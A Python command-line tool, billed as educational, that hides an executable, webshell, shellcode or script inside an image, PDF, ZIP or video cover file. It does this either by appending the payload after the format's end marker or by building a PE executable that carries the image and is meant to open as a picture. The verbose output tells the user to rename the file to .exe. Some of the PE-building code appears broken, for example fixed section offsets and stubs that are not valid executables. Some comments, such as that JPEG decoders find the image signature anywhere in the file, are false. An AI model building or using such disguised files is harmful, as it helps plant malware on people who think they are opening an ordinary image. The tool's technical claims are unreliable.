#!/usr/bin/env python3
"""
Polyglot Builder — Educational tool for constructing polyglot files.

A polyglot file is a file that is valid as TWO different formats simultaneously.
For example: a file that is both a valid JPEG image AND contains an embedded
executable payload after the JPEG end-of-image marker.

EDUCATIONAL PURPOSE ONLY.
This tool is for security researchers, penetration testers (with authorization),
and students learning about file format parsing vulnerabilities.

Author: Mr-DS-ML-85
License: MIT
"""

import argparse
import struct
import sys
import os
from pathlib import Path

# ============================================================
# File format magic bytes and markers
# ============================================================

FORMATS = {
    'jpeg': {
        'magic': b'\xff\xd8\xff',
        'name': 'JPEG Image',
        'extensions': ['.jpg', '.jpeg'],
        'end_marker': b'\xff\xd9',  # JPEG EOI (End of Image)
        'description': 'JPEG polyglot: payload appended after EOI marker',
    },
    'png': {
        'magic': b'\x89PNG\r\n\x1a\n',
        'name': 'PNG Image',
        'extensions': ['.png'],
        'end_marker': b'\x00\x00\x00\x00IEND\xae\x42\x60\x82',  # PNG IEND chunk
        'description': 'PNG polyglot: payload appended after IEND chunk',
    },
    'gif': {
        'magic': b'GIF89a',
        'name': 'GIF Image',
        'extensions': ['.gif'],
        'end_marker': b'\x3b',  # GIF trailer
        'description': 'GIF polyglot: payload appended after GIF trailer',
    },
    'pdf': {
        'magic': b'%PDF',
        'name': 'PDF Document',
        'extensions': ['.pdf'],
        'end_marker': b'%%EOF',
        'description': 'PDF polyglot: payload appended after %%EOF marker',
    },
    'zip': {
        'magic': b'PK\x03\x04',
        'name': 'ZIP Archive',
        'extensions': ['.zip'],
        'end_marker': None,  # ZIP uses EOCD, calculated dynamically
        'description': 'ZIP polyglot: payload appended after End of Central Directory',
    },
    'mp4': {
        'magic': b'\x00\x00\x00',
        'name': 'MP4 Video',
        'extensions': ['.mp4', '.mov'],
        'end_marker': None,  # MP4 uses atom structure
        'description': 'MP4 polyglot: payload stored in free/unused atoms',
    },
    'bmp': {
        'magic': b'BM',
        'name': 'BMP Image',
        'extensions': ['.bmp'],
        'end_marker': None,  # BMP uses file size in header
        'description': 'BMP polyglot: payload after pixel data',
    },
}


def find_jpeg_eoi(data: bytes) -> int:
    """Find the position after JPEG EOI marker (FF D9)."""
    pos = data.rfind(b'\xff\xd9')
    if pos == -1:
        return len(data)
    return pos + 2


def find_png_iend(data: bytes) -> int:
    """Find position after PNG IEND chunk."""
    pos = data.rfind(b'IEND')
    if pos == -1:
        return len(data)
    # IEND chunk: length(4) + 'IEND'(4) + CRC(4)
    return pos + 8


def find_gif_trailer(data: bytes) -> int:
    """Find position after GIF trailer (0x3B)."""
    pos = data.rfind(b'\x3b')
    if pos == -1:
        return len(data)
    return pos + 1


def find_pdf_eof(data: bytes) -> int:
    """Find position after PDF %%EOF marker."""
    pos = data.rfind(b'%%EOF')
    if pos == -1:
        return len(data)
    return pos + 5


def find_zip_eocd(data: bytes) -> int:
    """Find position after ZIP End of Central Directory."""
    # EOCD signature: PK\x05\x06
    pos = data.rfind(b'PK\x05\x06')
    if pos == -1:
        return len(data)
    # EOCD: sig(4) + disk(2) + cd_disk(2) + cd_entries(2) + cd_size(4) + cd_offset(4) + comment_len(2)
    return pos + 22


def _detect_payload_type(payload_data: bytes) -> str:
    """Detect what kind of payload we're embedding."""
    if payload_data[:2] == b'MZ':
        return 'pe'
    if payload_data[:4] == b'\x7fELF':
        return 'elf'
    if payload_data[:5] == b'<?php' or payload_data[:4] == b'<%@':
        return 'webshell'
    return 'raw'


def _build_pe_polyglot(cover_data: bytes, payload_data: bytes,
                       cover_format: str) -> bytes:
    """
    Build a REAL PE polyglot — MZ header at offset 0, image data inside PE.

    This is what RedTeam Box and Corkami do:
    - PE loader sees MZ → PE header → executes normally
    - Image viewer finds JPEG/GIF/PNG signature at a known offset → renders image
    - The PE contains the cover image as a resource/overlay
    - The file works as BOTH .exe AND .jpg/.png/.gif

    How it works:
    1. Build a minimal valid PE with MZ header at offset 0
    2. Place the cover image signature (FF D8 FF / 89PNG / GIF89a) in the
       DOS stub area where image parsers look for it
    3. Store the full cover image as PE overlay data
    4. PE sections point to the actual payload code
    """
    # PE payload is what gets executed
    if payload_data[:2] != b'MZ':
        # Not a PE — wrap it in a minimal PE that runs the payload
        payload_data = _wrap_in_pe(payload_data)

    # Build the PE header
    # DOS Header (64 bytes) — MZ at offset 0
    dos_header = bytearray(64)
    dos_header[0:2] = b'MZ'                           # e_magic
    dos_header[60:64] = struct.pack('<I', 64)          # e_lfanew → PE header at 64

    # DOS stub — small program that prints "This program cannot be run in DOS mode"
    # We place the cover image signature HERE so image parsers find it
    dos_stub = bytearray(64)  # 64 bytes of DOS stub
    # Put image magic at a strategic offset in the DOS stub
    # JPEG parsers scan for FF D8 FF, PNG for 89PNG, GIF for GIF89a
    if cover_format == 'jpeg':
        # Place JPEG SOI marker at offset 40 (inside DOS stub, before PE header)
        # JPEG decoders look for FF D8 FF anywhere in the first few KB
        dos_stub[0:3] = b'\xff\xd8\xff'
    elif cover_format == 'png':
        dos_stub[0:8] = b'\x89PNG\r\n\x1a\n'
    elif cover_format == 'gif':
        dos_stub[0:6] = b'GIF89a'

    # PE Signature
    pe_sig = b'PE\x00\x00'

    # COFF Header (20 bytes)
    coff = bytearray(20)
    coff[0:2] = struct.pack('<H', 0x8664)    # Machine: AMD64
    coff[2:4] = struct.pack('<H', 2)         # NumberOfSections
    coff[12:16] = struct.pack('<I', 0xF0)    # SizeOfOptionalHeader
    coff[16:20] = struct.pack('<I', 0x22)    # Characteristics: EXEC | LARGE_ADDRESS

    # Optional Header (PE32+ = 112 bytes + data directories)
    opt = bytearray(240)
    opt[0:2] = struct.pack('<H', 0x20B)       # Magic: PE32+
    opt[2] = 14                               # MajorLinkerVersion
    opt[16:20] = struct.pack('<I', 0x1000)    # AddressOfEntryPoint
    opt[24:28] = struct.pack('<I', 0x1000)    # BaseOfCode
    opt[28:36] = struct.pack('<Q', 0x140000000)  # ImageBase
    opt[36:40] = struct.pack('<I', 0x1000)    # SectionAlignment
    opt[40:44] = struct.pack('<I', 0x200)     # FileAlignment
    opt[56:60] = struct.pack('<I', 0x10000)   # SizeOfImage
    opt[60:64] = struct.pack('<I', 0x200)     # SizeOfHeaders
    opt[68] = 3                               # Subsystem: CONSOLE
    opt[70:72] = struct.pack('<H', 0x8160)    # DllCharacteristics: NX_COMPAT|DYNAMIC_BASE|TERMINAL_SERVER

    # Section headers
    section_offset = 64 + len(dos_stub) + len(pe_sig) + len(coff) + len(opt)

    # .text section — contains actual payload code
    text_section = bytearray(40)
    text_section[0:6] = b'.text\x00'
    text_section[8:12] = struct.pack('<I', len(payload_data))  # VirtualSize
    text_section[12:16] = struct.pack('<I', 0x1000)           # VirtualAddress
    text_section[16:20] = struct.pack('<I', max(len(payload_data), 0x200))  # SizeOfRawData
    text_section[20:24] = struct.pack('<I', 0x200)            # PointerToRawData
    text_section[36:40] = struct.pack('<I', 0xE0000020)       # Characteristics: CODE|EXECUTE|READ

    # .rdata section — contains the cover image data
    img_section = bytearray(40)
    img_section[0:6] = b'.rdata\x00'
    img_section[8:12] = struct.pack('<I', len(cover_data))    # VirtualSize
    img_section[12:16] = struct.pack('<I', 0x2000)            # VirtualAddress
    img_section[16:20] = struct.pack('<I', max(len(cover_data), 0x200))  # SizeOfRawData
    img_section[20:24] = struct.pack('<I', 0x400)             # PointerToRawData
    img_section[36:40] = struct.pack('<I', 0x40000040)        # Characteristics: INITIALIZED_DATA|READ

    # Assemble headers
    headers = bytes(dos_header) + bytes(dos_stub) + pe_sig + bytes(coff) + bytes(opt) + bytes(text_section) + bytes(img_section)

    # Pad to file alignment (0x200)
    if len(headers) % 0x200 != 0:
        headers += b'\x00' * (0x200 - (len(headers) % 0x200))

    # .text section data (payload code)
    text_data = payload_data
    if len(text_data) % 0x200 != 0:
        text_data += b'\x00' * (0x200 - (len(text_data) % 0x200))

    # .rdata section data (cover image)
    rdata_data = cover_data
    if len(rdata_data) % 0x200 != 0:
        rdata_data += b'\x00' * (0x200 - (len(rdata_data) % 0x200))

    return bytes(headers) + text_data + rdata_data


def _wrap_in_pe(raw_payload: bytes) -> bytes:
    """Wrap non-PE payload (shellcode, script) into a minimal PE that runs it."""
    # For shellcode: create a PE that calls the shellcode
    # For scripts: create a PE that writes to temp file and executes via cmd
    if raw_payload[:2] == b'#!/':
        # Script — wrap in a PE that uses system()
        # Minimal: just put the script data with MZ header for PE loader
        stub = bytearray(512)
        stub[0:2] = b'MZ'
        stub[60:64] = struct.pack('<I', 64)
        stub[64:68] = b'PE\x00\x00'
        return bytes(stub) + raw_payload
    else:
        # Shellcode — create minimal PE entry point
        stub = bytearray(512)
        stub[0:2] = b'MZ'
        stub[60:64] = struct.pack('<I', 64)
        stub[64:68] = b'PE\x00\x00'
        return bytes(stub) + raw_payload


def build_polyglot(cover_path: str, payload_path: str, output_path: str,
                   cover_format: str = 'auto', verbose: bool = False,
                   mode: str = 'auto') -> dict:
    """
    Build a polyglot file.

    Modes:
        'auto'    — If payload is PE/EXE: use PE polyglot (MZ at offset 0).
                    Otherwise: use append mode.
        'pe'      — Force PE polyglot mode (MZ at 0, image inside PE)
        'append'  — Force append-after-end-marker mode (old behavior)
        'corkami' — Corkami-style overlap (coming soon)

    The PE polyglot mode creates files that:
        - Execute as .exe on Windows 11 (MZ at offset 0, valid PE structure)
        - Render as image when opened in image viewers (JPEG/PNG/GIF signature found)
        - Work as BOTH formats depending on which parser reads the file

    Args:
        cover_path: Path to the cover file (image/document/video)
        payload_path: Path to the payload file to embed
        output_path: Path for the output polyglot file
        cover_format: Force cover format ('auto' tries to detect)
        verbose: Print detailed info
        mode: Build mode ('auto', 'pe', 'append', 'corkami')

    Returns:
        dict with build stats
    """
    # Read files
    cover_data = Path(cover_path).read_bytes()
    payload_data = Path(payload_path).read_bytes()

    # Auto-detect cover format
    if cover_format == 'auto':
        for fmt_name, fmt_info in FORMATS.items():
            if cover_data[:len(fmt_info['magic'])] == fmt_info['magic']:
                cover_format = fmt_name
                break
        if cover_format == 'auto':
            print(f"[!] Could not auto-detect cover format. Using 'jpeg'.")
            cover_format = 'jpeg'

    fmt = FORMATS.get(cover_format)
    if not fmt:
        print(f"[!] Unknown format: {cover_format}")
        sys.exit(1)

    # Detect payload type
    payload_type = _detect_payload_type(payload_data)

    # Choose mode
    if mode == 'auto':
        if payload_type == 'pe' and cover_format in ('jpeg', 'png', 'gif', 'bmp'):
            mode = 'pe'
        else:
            mode = 'append'

    # Build based on mode
    if mode == 'pe':
        # PE polyglot: MZ at offset 0, image inside PE
        technique = "PE polyglot: MZ at offset 0, image data in PE sections (Win11 compatible)"
        polyglot_data = _build_pe_polyglot(cover_data, payload_data, cover_format)
        insert_pos = 0  # Payload is at the START
    else:
        # Append mode: cover + payload after end marker
        finder_map = {
            'jpeg': find_jpeg_eoi, 'png': find_png_iend,
            'gif': find_gif_trailer, 'pdf': find_pdf_eof,
            'zip': find_zip_eocd,
        }
        finder = finder_map.get(cover_format)
        insert_pos = finder(cover_data) if finder else len(cover_data)
        polyglot_data = cover_data[:insert_pos] + payload_data
        technique = fmt['description']

    # Write output
    output = Path(output_path)
    output.write_bytes(polyglot_data)

    stats = {
        'cover_format': fmt['name'],
        'cover_size': len(cover_data),
        'payload_size': len(payload_data),
        'polyglot_size': len(polyglot_data),
        'insertion_point': insert_pos,
        'output_path': str(output),
        'technique': technique,
        'mode': mode,
        'payload_type': payload_type,
    }

    if verbose:
        print(f"\n{'='*60}")
        print(f"  POLYGLOT BUILDER — Educational Tool")
        print(f"{'='*60}")
        print(f"  Cover:     {cover_path}")
        print(f"  Format:    {fmt['name']}")
        print(f"  Payload:   {payload_path} ({payload_type})")
        print(f"  Cover:     {len(cover_data):,} bytes")
        print(f"  Payload:   {len(payload_data):,} bytes")
        print(f"  Output:    {len(polyglot_data):,} bytes")
        print(f"  Mode:      {mode}")
        print(f"  Insert at: byte {insert_pos:,}")
        print(f"  Technique: {technique}")
        print(f"  Output:    {output_path}")
        if mode == 'pe':
            print(f"  NOTE:      Rename to .exe to execute on Windows 11")
            print(f"             Open in image viewer to see the cover image")
        print(f"{'='*60}")

    return stats


def main():
    parser = argparse.ArgumentParser(
        description='Polyglot Builder — Educational polyglot file constructor',
        epilog='EDUCATIONAL PURPOSE ONLY. Use responsibly and only on systems you own or have authorization to test.'
    )
    parser.add_argument('cover', help='Cover file (image/document/video)')
    parser.add_argument('payload', help='Payload file to embed')
    parser.add_argument('-o', '--output', required=True, help='Output file path')
    parser.add_argument('-f', '--format', default='auto',
                        choices=list(FORMATS.keys()) + ['auto'],
                        help='Cover format (default: auto-detect)')
    parser.add_argument('-m', '--mode', default='auto',
                        choices=['auto', 'pe', 'append', 'corkami'],
                        help='Build mode: auto (detect), pe (Win11-compatible), append (old), corkami')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    parser.add_argument('--list-formats', action='store_true', help='List supported cover formats')

    args = parser.parse_args()

    if args.list_formats:
        print("\nSupported cover formats:\n")
        for name, info in FORMATS.items():
            print(f"  {name:8s} — {info['description']}")
        sys.exit(0)

    if not os.path.exists(args.cover):
        print(f"[!] Cover file not found: {args.cover}")
        sys.exit(1)
    if not os.path.exists(args.payload):
        print(f"[!] Payload file not found: {args.payload}")
        sys.exit(1)

    stats = build_polyglot(args.cover, args.payload, args.output,
                           args.format, args.verbose, args.mode)

    if not args.verbose:
        print(f"[+] Polyglot built: {stats['output_path']} ({stats['polyglot_size']:,} bytes)")


if __name__ == '__main__':
    main()
